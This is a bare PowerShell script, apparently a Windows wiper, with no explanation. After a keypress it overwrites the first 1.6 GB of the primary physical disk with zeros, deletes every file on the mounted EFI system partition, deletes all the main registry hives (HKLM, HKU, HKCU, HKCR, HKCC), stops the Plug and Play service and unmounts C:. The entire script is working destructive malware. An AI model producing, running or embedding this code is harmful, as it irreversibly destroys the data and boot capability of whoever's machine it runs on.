$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
$disk = "\\.\PhysicalDrive0"
$size = 1640960000
$bytes = New-Object byte[]($size)
try {
    $stream = New-Object System.IO.FileStream($disk, 'Open', 'ReadWrite')
    $stream.Position = 0
    $stream.Write($bytes, 0, $size)
} catch {
    Write-Host "Error writing to disk: $_"
} finally {
    if ($stream) { $stream.Close() }
}
cmd /c "mountvol S: /s"
if ($LASTEXITCODE -ne 0) { Write-Host "Mountvol error: $LASTEXITCODE" }
cmd /c "del /f /s /q S:*.* > NUL 2>&1"
cmd /c "reg delete HKLM /f"
cmd /c "reg delete HKCC /f"
cmd /c "reg delete HKU /f"
cmd /c "reg delete HKCR /f"
cmd /c "reg delete HKCU /f"
Stop-Service -Name PlugPlay -Force -ErrorAction SilentlyContinue
cmd /c "mountvol C: /d"
